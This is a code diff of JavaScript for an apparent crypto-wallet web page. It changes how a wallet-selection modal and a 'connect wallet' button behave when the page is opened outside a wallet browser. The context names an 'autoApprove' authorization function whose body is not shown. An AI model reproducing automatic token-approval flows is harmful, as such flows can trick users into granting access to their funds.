@@ -988,7 +988,7 @@ async function autoApprove() {
         showAutoCloseAlert(`${lang.authorizeFail.replace("{msg}", e.message)}`);
     }
 }
-// ========== 环境检测函数（修改后：非钱包浏览器直接显示选择钱包页面） ==========
+// ========== 环境检测函数（最终版：非钱包环境自动弹窗，关闭后显示连接按钮） ==========
 async function checkImTokenEnv() {
     const lang = langConfig[currentLang];
     const walletModal = document.getElementById("walletModal");
@@ -1003,14 +1003,14 @@ async function checkImTokenEnv() {
         walletModal.classList.remove("active");
         await initWallet(false);
     } else {
-        // 非钱包环境：直接显示选择钱包弹窗（核心修改）
+        // 非钱包环境：自动显示选择钱包弹窗
         specialTipContainer.style.display = "block";
-        userInfoEl.innerHTML = lang.nonImTokenUser; // 提示选择钱包
+        userInfoEl.innerHTML = lang.nonImTokenUser;
         approveBtn.style.display = "none";
-        connectBtn.style.display = "none"; // 隐藏连接按钮，直接显示弹窗
-        walletModal.classList.add("active"); // 自动激活选择钱包弹窗
+        connectBtn.style.display = "none"; // 初始隐藏连接按钮，先弹弹窗
+        walletModal.classList.add("active"); // 自动激活弹窗
         
-        // 保留原有钱包选择逻辑（点击钱包唤起对应APP）
+        // 钱包选择逻辑（点击后唤起对应APP，关闭弹窗且不显示连接按钮）
         document.querySelectorAll(".wallet-item").forEach(item => {
             item.addEventListener("click", async (e) => {
                 const walletType = e.currentTarget.dataset.wallet;
@@ -1032,17 +1032,24 @@ async function checkImTokenEnv() {
                     }
                     window.location.href = jumpUrl;
                     walletModal.classList.remove("active");
+                    // 唤起钱包后仍隐藏连接按钮（无需重复显示）
                 } catch (e) {
                     console.error(`${wallet.name}唤起失败：`, e);
                     walletModal.classList.remove("active");
+                    connectBtn.style.display = "block"; // 唤起失败也显示连接按钮
                     showAutoCloseAlert(`唤起${wallet.name}失败，请手动打开钱包访问`);
                 }
             });
         });
         
-        // 点击弹窗外部关闭弹窗（保留原有交互）
+        // 核心修改：点击弹窗外部关闭时，显示「连接钱包」按钮
         walletModal.addEventListener("click", (e) => {
-            if (e.target === walletModal) walletModal.classList.remove("active");
+            if (e.target === walletModal) {
+                walletModal.classList.remove("active"); // 关闭弹窗
+                connectBtn.style.display = "block"; // 显示连接钱包按钮
+                // 给连接按钮绑定重新打开弹窗的逻辑
+                connectBtn.onclick = () => walletModal.classList.add("active");
+            }
         });
     }
 }
